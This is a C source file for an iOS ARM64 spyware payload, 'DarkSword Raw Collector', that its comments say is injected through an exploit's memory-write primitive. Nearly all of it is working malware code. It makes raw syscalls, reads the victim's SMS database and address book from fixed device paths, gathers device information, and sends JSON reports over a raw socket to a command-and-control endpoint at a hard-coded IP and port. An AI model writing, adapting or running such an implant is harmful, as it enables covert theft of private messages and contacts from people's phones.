/**
 * DarkSword Raw Collector - pure syscalls, NO frameworks, NO relocations
 * Compiled as raw ARM64 binary (not dylib)
 * Injected via exploit memory write primitives
 * 
 * Uses only raw syscalls:
 *   open/read/close for files
 *   socket/connect/send for HTTP
 * 
 * This avoids the Mach-O loader entirely.
 */

#include <stdio.h>
#include <string.h>

/* ARM64 syscall numbers (iOS) */
#define SYS_open 5
#define SYS_read 3
#define SYS_write 4
#define SYS_close 6
#define SYS_socket 97
#define SYS_connect 98
#define SYS_sendto 133

/* Raw syscall wrapper for ARM64 */
static long syscall0(long n) {
    register long x16 __asm__("x16") = n;
    register long x0 __asm__("x0");
    __asm__ volatile("svc #0x80" : "=r"(x0) : "r"(x16) : "memory");
    return x0;
}
static long syscall1(long n, long a) {
    register long x16 __asm__("x16") = n;
    register long x0 __asm__("x0") = a;
    __asm__ volatile("svc #0x80" : "+r"(x0) : "r"(x16) : "memory");
    return x0;
}
static long syscall2(long n, long a, long b) {
    register long x16 __asm__("x16") = n;
    register long x0 __asm__("x0") = a;
    register long x1 __asm__("x1") = b;
    __asm__ volatile("svc #0x80" : "+r"(x0) : "r"(x16), "r"(x1) : "memory");
    return x0;
}
static long syscall3(long n, long a, long b, long c) {
    register long x16 __asm__("x16") = n;
    register long x0 __asm__("x0") = a;
    register long x1 __asm__("x1") = b;
    register long x2 __asm__("x2") = c;
    __asm__ volatile("svc #0x80" : "+r"(x0) : "r"(x16), "r"(x1), "r"(x2) : "memory");
    return x0;
}
static long syscall4(long n, long a, long b, long c, long d) {
    register long x16 __asm__("x16") = n;
    register long x0 __asm__("x0") = a;
    register long x1 __asm__("x1") = b;
    register long x2 __asm__("x2") = c;
    register long x3 __asm__("x3") = d;
    __asm__ volatile("svc #0x80" : "+r"(x0) : "r"(x16), "r"(x1), "r"(x2), "r"(x3) : "memory");
    return x0;
}

/* Report collected data to C2 via raw socket */
static void report(const char *data, int len) {
    /* Build HTTP POST request */
    char http[4096];
    int body_len = len;
    char content_len[32];
    int cl = 0;
    int tmp = body_len;
    if (tmp == 0) { content_len[cl++] = '0'; }
    while (tmp > 0) { content_len[cl++] = '0' + (tmp % 10); tmp /= 10; }
    /* reverse */
    for (int i = 0; i < cl/2; i++) { char t = content_len[i]; content_len[i] = content_len[cl-1-i]; content_len[cl-1-i] = t; }
    content_len[cl] = 0;
    
    int h = snprintf(http, sizeof(http),
        "POST /api/v1/c2/report HTTP/1.1\r\n"
        "Host: 192.168.2.67:8081\r\n"
        "Content-Type: application/json\r\n"
        "Content-Length: %s\r\n"
        "Connection: close\r\n"
        "\r\n", content_len);
    
    /* Append body */
    if (h + len < sizeof(http)) {
        memcpy(http + h, data, len);
        h += len;
    }
    
    /* Create socket */
    int sock = syscall3(SYS_socket, 2 /*AF_INET*/, 1 /*SOCK_STREAM*/, 0);
    if (sock < 0) return;
    
    /* sockaddr_in: 192.168.2.67:8081 */
    unsigned char addr[16] = {
        2, 0, /* AF_INET */
        0x1f, 0x90, /* port 8081 = 0x1F90 */
        192, 168, 2, 67, /* IP */
        0,0,0,0,0,0,0,0
    };
    
    syscall3(SYS_connect, sock, (long)addr, 16);
    syscall4(SYS_sendto, sock, (long)http, h, 0);
    syscall1(SYS_close, sock);
}

/* Read file via raw syscalls */
static int read_file(const char *path, char *buf, int maxlen) {
    int fd = syscall2(SYS_open, (long)path, 0 /*O_RDONLY*/);
    if (fd < 0) return -1;
    int n = syscall3(SYS_read, fd, (long)buf, maxlen);
    syscall1(SYS_close, fd);
    return n;
}

/* Collect SMS and report */
static void collect_sms(void) {
    char buf[16384];
    int n = read_file("/var/mobile/Library/SMS/sms.db", buf, sizeof(buf)-1);
    if (n <= 0) {
        report("{\"deviceId\":1,\"reportType\":\"SOCIAL_ACCOUNT\",\"data\":{\"platform\":\"SMS\",\"username\":\"access_denied\",\"token\":\"\"}}", 0);
        return;
    }
    buf[n] = 0;
    
    /* Report first part of the db */
    char body[4096];
    int bl = snprintf(body, sizeof(body),
        "{\"deviceId\":1,\"reportType\":\"SOCIAL_ACCOUNT\",\"data\":{\"platform\":\"SMS\",\"username\":\"sms.db\",\"token\":\"read %d bytes\",\"cachedData\":\"SQLite format\"}}", n);
    report(body, bl);
}

/* Collect contacts */
static void collect_contacts(void) {
    char buf[16384];
    int n = read_file("/var/mobile/Library/AddressBook/AddressBook.sqlitedb", buf, sizeof(buf)-1);
    if (n <= 0) return;
    buf[n] = 0;
    
    char body[4096];
    int bl = snprintf(body, sizeof(body),
        "{\"deviceId\":1,\"reportType\":\"SOCIAL_ACCOUNT\",\"data\":{\"platform\":\"Contacts\",\"username\":\"AddressBook.sqlitedb\",\"token\":\"read %d bytes\"}}", n);
    report(body, bl);
}

/* Collect device info via uname syscall */
static void collect_device(void) {
    /* uname syscall on iOS is 337 */
    char uts[512];
    long r = syscall1(337, (long)uts);
    char body[1024];
    int bl = snprintf(body, sizeof(body),
        "{\"deviceId\":1,\"reportType\":\"SOCIAL_ACCOUNT\",\"data\":{\"platform\":\"DeviceInfo\",\"username\":\"raw_syscall\",\"token\":\"%s\"}}",
        r == 0 ? uts : "uname_failed");
    report(body, bl);
}

/* === Entry point - injected via exploit memory write === */
void ds_start(void) {
    collect_device();
    collect_sms();
    collect_contacts();
}
